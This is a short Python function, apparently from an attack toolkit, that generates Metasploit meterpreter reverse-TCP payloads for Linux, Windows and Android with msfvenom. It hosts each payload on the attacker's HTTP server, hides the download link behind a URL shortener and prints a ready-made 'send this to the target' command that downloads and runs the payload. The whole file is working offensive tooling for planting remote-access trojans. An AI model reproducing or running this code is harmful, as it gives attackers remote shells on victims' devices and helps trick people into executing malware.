def generate_payload(platform):
    payloads = {
        "linux": "linux/x64/meterpreter/reverse_tcp",
        "windows": "windows/x64/meterpreter/reverse_tcp",
        "android": "android/meterpreter/reverse_tcp"
    }
    
    extensions = {
        "linux": ".elf",
        "windows": ".exe",
        "android": ".apk"
    }
    
    if platform not in payloads:
        print("[!] Invalid platform.")
        return
    
    filename = random_name(extensions[platform])
    
    print(f"[*] Generating {platform.capitalize()} payload...")
    os.system(f"msfvenom -p {payloads[platform]} LHOST={LHOST} LPORT={LPORT} -f {extensions[platform][1:]} -o {filename}")
    
    # ✅ Always set the payload as executable
    os.system(f"chmod +x {filename}")

    print(f"[+] {platform.capitalize()} payload created: {filename}")
    
    # ✅ Generate and shorten the URL
    short_link = shorten_url(f"http://{LHOST}:{HTTP_PORT}/{filename}")
    
    # ✅ Automatically generate the execution command for the target
    execution_command = f"wget -qO {filename} {short_link} && chmod +x {filename} && ./{filename}"
    
    print(f"[*] Send this to the target:\n    {execution_command}")
